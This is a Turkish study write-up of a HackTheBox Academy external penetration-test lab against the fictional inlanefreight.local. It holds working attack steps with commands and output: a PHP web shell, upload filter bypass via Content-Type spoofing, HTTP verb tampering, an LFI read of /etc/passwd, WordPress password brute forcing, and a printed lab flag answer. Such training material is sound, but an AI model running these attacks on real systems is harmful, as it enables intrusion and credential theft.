Port 111, dışarıdan maruz bırakılmaması gereken rpcbind servisidir, bu nedenle Gereksiz Maruz Bırakılan Servisler için Düşük bulgu veya benzeri bir şey yazabiliriz. Bu port, işletim sisteminin parmak izini almak veya mevcut hizmetler hakkında potansiyel olarak bilgi toplamak için araştırılabilir. Bunu rpcinfo komutu veya Nmap ile araştırmayı deneyebiliriz. Çalışır, ancak yararlı bir şey elde edemeyiz. Yine, dikkat çekmeye değer, böylece client neyi açığa çıkardığının farkında olur, ancak bununla yapabileceğimiz başka bir şey yoktur.

```shell-session
M1R4CKCK@htb[/htb]$ rpcinfo 10.129.203.101

   program version netid     address                service    owner
    100000    4    tcp6      ::.0.111               portmapper superuser
    100000    3    tcp6      ::.0.111               portmapper superuser
    100000    4    udp6      ::.0.111               portmapper superuser
    100000    3    udp6      ::.0.111               portmapper superuser
    100000    4    tcp       0.0.0.0.0.111          portmapper superuser
    100000    3    tcp       0.0.0.0.0.111          portmapper superuser
    100000    2    tcp       0.0.0.0.0.111          portmapper superuser
    100000    4    udp       0.0.0.0.0.111          portmapper superuser
    100000    3    udp       0.0.0.0.0.111          portmapper superuser
    100000    2    udp       0.0.0.0.0.111          portmapper superuser
    100000    4    local     /run/rpcbind.sock      portmapper superuser
    100000    3    local     /run/rpcbind.sock      portmapper superuser
```

Bu servisle ilgili gelecekteki farkındalık için [rpcbind Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind) hakkındaki bu HackTricks kılavuzuna başvurmaya değer.

Son port, bildiğimiz gibi HTTP servisi olan 80 numaralı porttur. Daha önce yaptığımız subdomain ve vhost numaralandırmasına dayanarak muhtemelen birden fazla web uygulaması olduğunu biliyoruz. Öyleyse web'e geçelim. Bir avuç orta ve düşük riskli bulgu dışında hala bir dayanağımız ya da çok fazla bir şeyimiz yok. Modern ortamlarda, remote code execution'a (RCE) yol açacak savunmasız bir FTP sunucusu veya benzeri gibi dışarıdan istismar edilebilir hizmetleri nadiren görüyoruz. Yine de asla asla demeyin. Daha çılgınca şeyler gördük, bu yüzden her zaman her olasılığı araştırmaya değer. Karşılaştığımız çoğu kuruluş, genellikle geniş bir saldırı yüzeyi sunduğundan, web uygulamaları aracılığıyla saldırıya en duyarlı olacaktır, bu nedenle genellikle bir External Penetration testi sırasında zamanımızın çoğunu web uygulamalarını numaralandırarak ve saldırarak geçireceğiz.


Soru : Erişilebilir hizmetleri numaralandırın ve bir bayrak bulun. Bayrak değerini cevabınız olarak gönderin (bayrak formatı: HTB{ }).

Cevap :  HTB{0eb0ab788df18c3115ac43b1c06ae6c4}

![Pasted image 20241230195134.png](/img/user/resimler/Pasted%20image%2020241230195134.png)

![Pasted image 20241230195141.png](/img/user/resimler/Pasted%20image%2020241230195141.png)


# Web Enumeration & Exploitation

- **Web Uygulamaları ve External Penetration Test**: Web uygulamaları, External Penetration Test sırasında zamanımızın çoğunu harcadığımız alanlardır. Bu uygulamalar genellikle geniş bir saldırı yüzeyi sunar ve uzak kod çalıştırma (remote code execution) veya hassas verilerin açığa çıkması gibi güvenlik açıklarına sahip olabilirler.
    
- **WASA ve External Penetration Test Arasındaki Fark**: Web Uygulaması Güvenlik Değerlendirmesi (WASA) ile External Penetration Test arasında önemli bir fark vardır. WASA sırasında, tüm güvenlik açıklarını, ne kadar sıradan olursa olsun (örneğin, HTTP yanıt başlıklarında bir web sunucusu sürümü veya eksik Secure/HttpOnly bayraklı bir cookie) bulmak ve raporlamakla görevlendiriliriz.
    
- **External Penetration Test ve Odak**: External Penetration Test sırasında, genellikle çok fazla yol kat etmemiz gerektiğinden, sıradan güvenlik açıklarıyla boğuşmak istemeyiz. Bu testte daha çok yüksek riskli güvenlik açıklarına odaklanmamız gerekir.
    
- **Work Scope (SoW) Belgesi**: Work Scope (SoW) belgesi, iki değerlendirme türü arasında net bir ayrım yapmalıdır. External Penetration Test sırasında, daha çok yüksek riskli güvenlik açıklarını hedef alacağımız açıkça belirtilmelidir.
    
- **Daha Derinlemesine Web Uygulaması Testi**: Eğer çok fazla bulgumuz yoksa, web uygulamaları daha derinlemesine incelenebilir. Bu durumda, diğer küçük güvenlik sorunlarının yanı sıra, yaygın HTTP yanıt başlıkları sorunlarına dair genel bir En İyi Uygulama Önerisi veya Bilgilendirici bulgu eklenebilir.

Bu şekilde, SQL injection, unrestricted file upload, XSS, XXE, file inclusion attacks, command injections gibi büyük sorunlara odaklanarak sözleşmeyi yerine getirmiş olduk, ancak müşteri neden X'yi raporlamadığımızı sorarsa diye bilgilendirici bir bulgu ile kendimizi güvenceye almış olduk.


## Web Application Enumeration

Bir grup web uygulamasının üstesinden gelmenin en hızlı ve en etkili yolu, Application Discovery & Enumeration bölümündeki Attacking Common Applications modülünde anlatıldığı gibi EyeWitness gibi bir araç kullanarak her bir web uygulamasının ekran görüntülerini almaktır. Bu, özellikle değerlendirmemiz için büyük bir kapsamımız varsa ve her web uygulamasına teker teker göz atmak mümkün değilse faydalıdır. Bizim durumumuzda, 11 subdomain/vhosts'umuz var (şimdilik), bu nedenle müşteriye mümkün olan en iyi değerlendirmeyi vermek için mümkün olduğunca verimli olmak istediğimizden bize yardımcı olması için EyeWitness'ı çalıştırmaya değer. Bu, bir şeyleri kaçırma olasılığı olmadan daha hızlı ve daha verimli bir şekilde gerçekleştirilebilecek tüm görevleri hızlandırmak anlamına gelir. Otomasyon harikadır, ancak peşinden gittiğimiz şeyin yarısını kaçırıyorsak, otomasyon yarardan çok zarar veriyor demektir. Araçlarınızın ne yaptığını anladığınızdan emin olun ve araçlarınızın ve özel komut dosyalarınızın beklendiği gibi çalıştığından emin olmak için düzenli olarak kontrol edin.

```shell-session
M1R4CKCK@htb[/htb]$ cat ilfreight_subdomains

inlanefreight.local 
blog.inlanefreight.local 
careers.inlanefreight.local 
dev.inlanefreight.local 
gitlab.inlanefreight.local 
ir.inlanefreight.local 
status.inlanefreight.local 
support.inlanefreight.local 
tracking.inlanefreight.local 
vpn.inlanefreight.local
monitoring.inlanefreight.local
```

EyeWitness'ı bir Nmap .xml dosyası veya bir Nessus taraması ile besleyebiliriz; bu, çok sayıda açık porta sahip geniş bir kapsamımız olduğunda kullanışlıdır, bu genellikle bir İç Penetrasyon Testi sırasında olabilir. Bizim durumumuzda, daha önce numaralandırdığımız bir metin dosyasındaki subdomainlerin listesini vermek için sadece -f bayrağını kullanacağız.

- **`-f`**: Bu parametre, **EyeWitness** aracına hangi dosya türünün kullanılacağını belirtir. Burada, `ilfreight_subdomains` dosyasını belirtmekte ve bu dosyanın içinde taranacak subdomains listesi bulunmaktadır.
    
- **`-d`**: Bu parametre, **EyeWitness** aracına çıktı dosyasının kaydedileceği dizini belirtir. Bu örnekte, çıktı **ILFREIGHT_subdomain_EyeWitness** adlı bir dizine kaydedilecektir. Bu dizin, EyeWitness'in elde ettiği ekran görüntülerini ve tarama verilerini içerecektir.

```shell-session
M1R4CKCK@htb[/htb]$ eyewitness -f ilfreight_subdomains -d ILFREIGHT_subdomain_EyeWitness

################################################################################
#                                  EyeWitness                                  #
################################################################################
#           FortyNorth Security - https://www.fortynorthsecurity.com           #
################################################################################

Starting Web Requests (11 Hosts)
Attempting to screenshot http://inlanefreight.local
Attempting to screenshot http://blog.inlanefreight.local
Attempting to screenshot http://careers.inlanefreight.local
Attempting to screenshot http://dev.inlanefreight.local
Attempting to screenshot http://gitlab.inlanefreight.local
Attempting to screenshot http://ir.inlanefreight.local
Attempting to screenshot http://status.inlanefreight.local
Attempting to screenshot http://support.inlanefreight.local
Attempting to screenshot http://tracking.inlanefreight.local
Attempting to screenshot http://vpn.inlanefreight.local
Attempting to screenshot http://monitoring.inlanefreight.local
Finished in 34.79010033607483 seconds

[*] Done! Report written in the /home/tester/INLANEFREIGHT-IPT/Evidence/Scans/Web/ILFREIGHT_subdomain_EyeWitness folder!
Would you like to open the report now? [Y/n]
n
```

![Pasted image 20241230212537.png](/img/user/resimler/Pasted%20image%2020241230212537.png)

EyeWitness sonuçları bize, iç ağda bir yer edinmek için herhangi birinden potansiyel olarak yararlanılabilecek çok sayıda ilginç host gösteriyor. Şimdi bunları teker teker inceleyelim.

## blog.inlanefreight.local

İlk olarak blog.inlanefreight.local subdomain. İlk bakışta umut verici görünüyor. Site unutulmuş bir Drupal kurulumu veya belki de kurulmuş ve hiç güçlendirilmemiş bir deneme sitesi gibi görünüyor. Fikir edinmek için Drupal - Attacking Common Applications modülünün Discovery & Enumeration'ına başvurabiliriz.

![Pasted image 20241230212638.png](/img/user/resimler/Pasted%20image%2020241230212638.png)

cURL kullanarak Drupal 9'un kullanımda olduğunu görebiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ curl -s http://blog.inlanefreight.local | grep Drupal

<meta name="Generator" content="Drupal 9 (https://www.drupal.org)" />
      <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
```

Hızlı bir Google araması bize üretim için tasarlanan mevcut kararlı [Drupal sürümünün 9.4](https://www.drupal.org/project/drupal/releases) olduğunu gösteriyor, bu nedenle muhtemelen şanslı olmamız ve built-in fonksiyonelliği kötüye kullanmak için zayıf bir yönetici şifresi veya savunmasız bir plugin gibi bir çeşit yanlış yapılandırma bulmamız gerekecek. Drupalgeddon 1-3 gibi iyi bilinen güvenlik açıkları Drupal'in 9.x sürümünü etkilemez, bu yüzden bu bir çıkmaz sokaktır. admin:admin, admin:Welcome1 gibi birkaç zayıf şifre kombinasyonuyla oturum açmaya çalışmak sonuç vermiyor. Bir kullanıcı kaydetme girişimi de başarısız oluyor, bu yüzden bir sonraki uygulamaya geçiyoruz.

Raporumuzda bu Drupal örneğinin kullanılmıyor gibi göründüğünü ve genel dış saldırı yüzeyini daha da azaltmak için kaldırılmaya değer olabileceğini not edebiliriz.

## careers.inlanefreight.local

Sırada careers subdomain var. Bu tür siteler genellikle bir kullanıcının bir hesap açmasına, bir CV ve potansiyel olarak bir profil resmi yüklemesine izin verir. Bu ilginç bir saldırı yolu olabilir. İlk olarak http://careers.inlanefreight.local/login giriş sayfasına göz atarak, bazı yaygın kimlik doğrulama atlamalarını deneyebilir ve kimlik doğrulamayı atlamaya çalışmak veya bir SQL enjeksiyonunun göstergesi olabilecek bir tür hata mesajı veya zaman gecikmesine neden olmak için giriş formunu fuzzing yapmayı deneyebiliriz. Her zaman olduğu gibi, admin:admin gibi birkaç zayıf şifre kombinasyonunu test ediyoruz. Ayrıca oturum açma formlarını (ve varsa parolayı unuttum formlarını) her zaman kullanıcı adı numaralandırması için test etmeliyiz, ancak bu durumda hiçbiri görünmüyor.

http://careers.inlanefreight.local/apply sayfası iş başvurusu yapmamıza ve CV yüklememize izin veriyor. Bu fonksiyonu test ettiğimizde herhangi bir dosya türünün yüklenmesine izin verdiğini görüyoruz ancak HTTP yanıtı dosyanın yüklendikten sonra nerede olduğunu göstermiyor. Directory brute-forcing, /files veya /uploads gibi, kötü amaçlı bir dosyayı başarıyla yükleyebilmemiz durumunda bir web shell'i barındırabilecek herhangi bir ilginç dizin ortaya çıkarmaz.

Karşılaştığımız herhangi bir web uygulamasında kullanıcı kayıt fonksiyonelliğini test etmek her zaman iyi bir fikirdir, çünkü bunlar her türlü soruna yol açabilir. HTB box [Academy](https://0xdf.gitlab.io/2021/02/27/htb-academy.html)'de, bir web uygulamasına kaydolmak ve kayıt sırasında rolümüzü bir admin olarak değiştirmek mümkündür. Bu, internete dönük bir web uygulamasına beş farklı kullanıcı rolü için kaydolabildiğim gerçek bir External Penetration Test bulgusundan esinlenmiştir. Bu uygulamaya giriş yapıldığında, her türlü IDOR güvenlik açığı mevcuttu ve bu da birçok sayfada broken authorization neden oluyordu.

Hadi, **[http://careers.inlanefreight.local/register](http://careers.inlanefreight.local/register)** adresinden bir hesap oluşturalım ve etrafa bakalım. Sahte bilgilerle bir hesap kaydediyoruz: **test@test.com** ve kimlik bilgileri olarak **pentester:Str0ngP@ssw0rd!** kullanıyoruz. Bazen bir aktivasyon bağlantısı almak için gerçek bir e-posta adresi kullanmamız gerekebilir. Gelen kutumuzu doldurmamak için [**10 Minute Mail**](https://10minutemail.com/) gibi bir geçici e-posta hizmeti kullanabiliriz veya test amaçlı **ProtonMail** gibi bir servisle bir sahte hesap tutabiliriz. İlk defa **Burp Suite Active Scanner** bir formu tarayıp hızla 1.000+ e-posta gönderdiğinde gerçek e-posta adresinizi kullanmadığınız için mutlu olacaksınız.

Ayrıca, güçlü kimlik bilgileriyle kayıt olun. Test:test gibi basit kimlik bilgileriyle kaydolup, test tamamlandıktan sonra uygulamada bırakılabilecek bir güvenlik sorunu yaratmak istemezsiniz (tabii ki, bir test sırasında yapılan herhangi bir değişikliği, halka açık bir web sitesinde kayıt oluşturmak da dahil olmak üzere, raporumuzun ekinde listelemeliyiz).

Kaydolduktan sonra giriş yapabilir ve etrafa göz atabiliriz. Bizi http://careers.inlanefreight.local/profile?id=9 adresinde profil sayfamız karşılıyor. SQLi, komut enjeksiyonu, dosya ekleme, XSS, vb. için id parametresini fuzz'lamaya çalıştığımızda sonuç alamıyoruz. ID numarasının kendisi ilginçtir. Bu numarayı değiştirmek bize diğer kullanıcıların profillerine erişebileceğimizi ve hangi işlere başvurduklarını görebileceğimizi gösteriyor. Bu, Insecure Direct Object Reference (IDOR) güvenlik açığının klasik bir örneğidir ve hassas verilerin açığa çıkma potansiyeli nedeniyle kesinlikle rapor edilmeye değerdir.

Buradaki tüm seçenekleri değerlendirdikten sonra, bulgular listemize eklemek ve bir sonraki web uygulamasına geçmek için iyi bir raporlanabilir güvenlik açığı ile uzaklaşıyoruz. Burada herhangi bir directory brute-forcing aracını kullanabiliriz, ancak biz Gobuster ile devam edeceğiz.

## dev.inlanefreight.local

http://dev.inlanefreight.local adresindeki web uygulaması basit ancak göze çarpıyor. URL'sinde veya adında dev olan her şey ilginçtir, çünkü bu potansiyel olarak yanlışlıkla açığa çıkabilir ve kusurlarla doludur/üretime hazır değildir. Uygulama Key Vault başlıklı basit bir giriş formu sunuyor. Bu, Homegrown Password Manager ya da benzeri bir uygulamaya benziyor ve eğer içeri girebilirsek önemli miktarda verinin açığa çıkmasına neden olabilir. Zayıf parola kombinasyonları ve kimlik doğrulama bypass payload'ları bizi hiçbir yere götürmez, bu yüzden temellere geri dönelim ve diğer sayfaları ve dizinleri arayalım. İlk çalıştırma için .php dosya uzantılarını kullanarak common.txt kelime listesi ile deneyelim.

```shell-session
M1R4CKCK@htb[/htb]$ gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.inlanefreight.local
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/06/20 22:04:48 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 288]
/.htpasswd            (Status: 403) [Size: 288]
/.hta                 (Status: 403) [Size: 288]
/.htpasswd.php        (Status: 403) [Size: 288]
/.hta.php             (Status: 403) [Size: 288]
/css                  (Status: 301) [Size: 332] [--> http://dev.inlanefreight.local/css/]
/images               (Status: 301) [Size: 335] [--> http://dev.inlanefreight.local/images/]
/index.php            (Status: 200) [Size: 2048]                                            
/index.php            (Status: 200) [Size: 2048]                                            
/js                   (Status: 301) [Size: 331] [--> http://dev.inlanefreight.local/js/]    
/server-status        (Status: 403) [Size: 288]                                             
/uploads              (Status: 301) [Size: 336] [--> http://dev.inlanefreight.local/uploads/]
/upload.php           (Status: 200) [Size: 14]                                               
/.htaccess.php        (Status: 403) [Size: 288]                                              
                                                                                             
===============================================================
2022/06/20 22:05:02 Finished
===============================================================
```

Birkaç ilginç sonuç alıyoruz. 403 forbidden hata koduna sahip dosyalar tipik olarak dosyaların var olduğu anlamına gelir, ancak web sunucusu onlara anonim olarak göz atmamıza izin vermez. Uploads ve upload.php sayfaları hemen dikkatimizi çeker. Eğer bir PHP web shell'i yükleyebiliyorsak, büyük ihtimalle dizin listelemenin etkin olduğu /uploads dizinine doğrudan göz atabiliriz. Bunu geçerli bir düşük riskli bulgu olan Directory Listing Enabled olarak not edebilir ve rapor yazımını hızlı ve zahmetsiz hale getirmek için gerekli kanıtları yakalayabiliriz. upload.php dosyasına göz attığımızda 403 Forbidden hata mesajıyla karşılaşıyoruz, ancak durum kodu 200 OK başarı kodu olduğu için bu ilginç bir durum. Bunu daha derinlemesine inceleyelim.

Burada isteği yakalamak ve neler olup bittiğini anlamak için Burp Suite'e ihtiyacımız olacak. İsteği yakalayıp Burp Repeater'a gönderirsek ve ardından OPTIONS yöntemini kullanarak sayfayı yeniden talep edersek, çeşitli yöntemlere izin verildiğini görürüz: GET,POST,PUT,TRACK,OPTIONS. TRACK yöntemini deneyip HTTP yanıtında X-Custom-IP-Authorization: başlığının ayarlandığını görene kadar çeşitli seçenekler arasında dolaştığımızda her biri bize bir sunucu hatası verir. Bu saldırı türü hakkında bilgi edinmek için HTTP Verb Tampering hakkındaki Web Attacks modüllerine başvurabiliriz.

![Pasted image 20241231015529.png](/img/user/resimler/Pasted%20image%2020241231015529.png)

İstekle biraz oynamak ve X-Custom-IP-Authorization header'ını eklemek: 127.0.0.1 başlığını Burp Repeater'daki HTTP isteğine eklemek ve ardından sayfayı TRACK yöntemiyle tekrar istemek ilginç bir sonuç verir. HTTP response body'de bir dosya yükleme formu gibi görünen bir şey görüyoruz.

![Pasted image 20241231015610.png](/img/user/resimler/Pasted%20image%2020241231015610.png)

Repeater'daki Response penceresinde herhangi bir yere sağ tıklarsak, yanıtı tarayıcıda göster'i seçebilir, ortaya çıkan URL'yi kopyalayabilir ve Burp proxy ile kullandığımız tarayıcıda talep edebiliriz. Bizim için bir fotoğraf düzenleme platformu yüklenir.

![Pasted image 20241231015735.png](/img/user/resimler/Pasted%20image%2020241231015735.png)

Browse butonuna tıklayabilir ve aşağıdaki içeriğe sahip basit bir webshell yüklemeyi deneyebiliriz:

```php
<?php system($_GET['cmd']); ?>
```

Dosyayı 5351bf7271abaa2267e03c9ef6393f13.php veya benzer bir şekilde kaydedin. Halka açık bir web sitesine bir web shell yüklerken rastgele dosya adları oluşturmak iyi bir uygulamadır, böylece rastgele bir saldırgan bu dosyayı bulamaz. Bizim durumumuzda, dizin listeleme etkin olduğundan ve herhangi biri /uploads dizinine göz atıp onu bulabileceğinden, parola korumalı veya IP adresimizle sınırlı bir şey kullanmak isteriz. .php dosyasını doğrudan yüklemeye çalıştığınızda bir hata ile karşılaşırsınız: “JPG, JPEG, PNG ve GIF dosyalarına izin verilir.”, bu da bazı zayıf client-side doğrulamalarının muhtemelen mevcut olduğunu gösterir. POST isteğini alıp bir kez daha Repeater'a gönderebilir ve dosyamızı geçerli olarak kabul etmesi için uygulamayı kandırıp kandıramayacağımızı görmek için istekteki Content-Type: başlığını değiştirmeyi deneyebiliriz. Web shell'imizi geçerli bir PNG resim dosyası olarak göstermek için başlığı Content-Type: image/png olarak değiştirmeyi deneyeceğiz. İşe yarıyor! Aşağıdaki yanıtı alıyoruz: Dosya yüklendi /uploads/5351bf7271abaa2267e03c9ef6393f13.php.

Artık bu web shell ile etkileşime geçmek ve web sunucusunda komutlar çalıştırmak için cURL kullanabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Hostun IP adresini kontrol ettiğimizde, IP adresi internal ağ kapsamında olmadığından Inlanefreight iç ağına girmiş gibi görünmüyoruz. Bu sadece bağımsız bir web sunucusu olabilir, bu yüzden devam edeceğiz.

```shell-session
M1R4CKCK@htb[/htb]$ curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=hostname%20-I

172.18.0.3
```

Buradan, hassas verileri arayarak hostu daha fazla numaralandırabilir, diğer iki bulguyu not edebiliriz: HTTP Verb Tampering ve Unrestricted File Upload, ve bir sonraki host'a geçebiliriz.


## ir.inlanefreight.local

Listemizdeki bir sonraki hedef, şirketin WordPress ile barındırılan Investor Relations Portalı olan http://ir.inlanefreight.local. Bunun için Attacking Common Applications modülünün WordPress - Discovery & Enumeration bölümüne başvurabiliriz. WPScan'i çalıştıralım ve tüm pluginleri listelemek için -ap bayrağını kullanarak neleri listeleyebileceğimize bakalım.

```shell-session
[!bash!]$ sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local

<SNIP>

[+] WordPress version 6.0 identified (Latest, released on 2022-05-24).
 | Found By: Rss Generator (Passive Detection)
 |  - http://ir.inlanefreight.local/feed/, <generator>https://wordpress.org/?v=6.0</generator>
 |  - http://ir.inlanefreight.local/comments/feed/, <generator>https://wordpress.org/?v=6.0</generator>

[+] WordPress theme in use: cbusiness-investment
 | Location: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/
 | Latest Version: 0.7 (up to date)
 | Last Updated: 2022-04-25T00:00:00.000Z
 | Readme: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/readme.txt
 | Style URL: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0
 | Style Name: CBusiness Investment
 | Style URI: https://www.themescave.com/themes/wordpress-theme-finance-free-cbusiness-investment/
 | Description: CBusiness Investment WordPress theme is used for all type of corporate business. That Multipurpose T...
 | Author: Themescave
 | Author URI: http://www.themescave.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0, Match: 'Version: 0.7'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] b2i-investor-tools
 | Location: http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/
 | Latest Version: 1.0.5 (up to date)
 | Last Updated: 2022-06-17T15:21:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0.5 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/style.css?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/export.css?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/wb_script.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amcharts.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/serial.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amstock.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/export.js?ver=1.0.5
 | Confirmed By: Readme - Stable Tag (Aggressive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/readme.txt

[+] mail-masta
 | Location: http://ir.inlanefreight.local/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jun 20 23:07:09 2022
[+] Requests Done: 35
[+] Cached Requests: 7
[+] Data Sent: 9.187 KB
[+] Data Received: 164.854 KB
[+] Memory used: 224.816 M
```

Taramadan aşağıdaki bilgi parçalarını çıkarabiliriz:

* WordPress core versiyonu en son versiyonudur (yazım sırasında 6.0)
* Kullanılan tema cbusiness-investment
* b2i-investor-tools plugin'i yüklendi
* mail-masta plugini yüklendi

Mail Masta plugin, bilinen birkaç güvenlik açığı olan eski bir plugindir. [Bu](https://www.exploit-db.com/exploits/50226) exploit'i, Local File Inclusion (LFI) güvenlik açığından yararlanarak altta yatan dosya sistemindeki dosyaları okumak için kullanabiliriz.


```shell-session
[!bash!]$ curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

Listemize başka bir bulgu daha ekleyebiliriz: Local File Inclusion (LFI). Şimdi devam edelim ve WPScan kullanarak WordPress kullanıcılarını listeleyip listeleyemeyeceğimize bakalım.

```shell-session
[!bash!]$ wpscan -e u -t 500 --url http://ir.inlanefreight.local

<SNIP>

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <===================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] ilfreightwp
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] james
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jun 20 23:14:33 2022
[+] Requests Done: 28
[+] Cached Requests: 37
[+] Data Sent: 8.495 KB
[+] Data Received: 269.719 KB
[+] Memory used: 176.859 MB
[+] Elapsed time: 00:00:0
```

Birkaç kullanıcı bulduk:

- ilfreightwp
- tom
- james
- john

[SecLists GitHub](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top100.txt) deposundaki bu kelime listesini kullanarak hesap parolalarından birini brute-force yapmayı deneyelim. WPScan'i tekrar kullanarak, ilfreightwp hesabı için bir isabet elde ediyoruz.

```shell-session
[!bash!]$ wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp

<SNIP>

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - ilfreightwp / password1                                                                              
Trying ilfreightwp / 123123 Time: 00:00:00 <===                                > (10 / 109)  9.17%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: ilfreightwp, Password: password1

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jun 20 23:31:34 2022
[+] Requests Done: 186
[+] Cached Requests: 7
[+] Data Sent: 54.2 KB
[+] Data Received: 253.754 KB
[+] Memory used: 241.836 MB
[+] Elapsed time: 00:00:16
```

Buradan http://ir.inlanefreight.local/wp-login.php adresine gidebilir ve ilfreightwp:password1 kimlik bilgilerini kullanarak giriş yapabiliriz. Giriş yaptıktan sonra, http://ir.inlanefreight.local/wp-admin/ adresine yönlendirileceğiz ve burada http://ir.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty adresine giderek etkin olmayan Twenty Twenty teması için 404.php dosyasını düzenleyebilir ve Remote Code execution elde etmek için bir PHP web shell ekleyebiliriz. Bu sayfayı düzenledikten ve Attacking Common Applications modülünün Attacking WordPress bölümündeki adımları izleyerek kod çalıştırmayı başardıktan sonra, Weak WordPress Admin Credentials için bir bulgu daha kaydedebilir ve müşterimize bu WordPress sitesini dışarıya açık bırakmayı planlıyorlarsa çeşitli güçlendirme önlemleri almasını tavsiye edebiliriz.


## status.inlanefreight.local

